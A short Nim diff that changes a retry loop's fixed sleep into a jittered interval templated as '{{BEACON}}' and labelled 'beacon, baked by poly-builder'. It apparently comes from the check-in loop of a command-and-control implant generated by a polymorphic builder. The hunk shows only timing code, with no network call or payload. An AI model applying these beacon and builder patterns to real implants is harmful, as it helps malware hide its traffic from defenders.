@@ -267,7 +267,7 @@ proc main() {.async.} =
       await serveOnce()
       break
     except CatchableError:
-      await sleepAsync(5000 + rand(3000))
+      await sleepAsync({{BEACON}} * 1000 + rand({{BEACON}} * 600))  # beacon, baked by poly-builder
 
 when isMainModule:
   waitFor main()
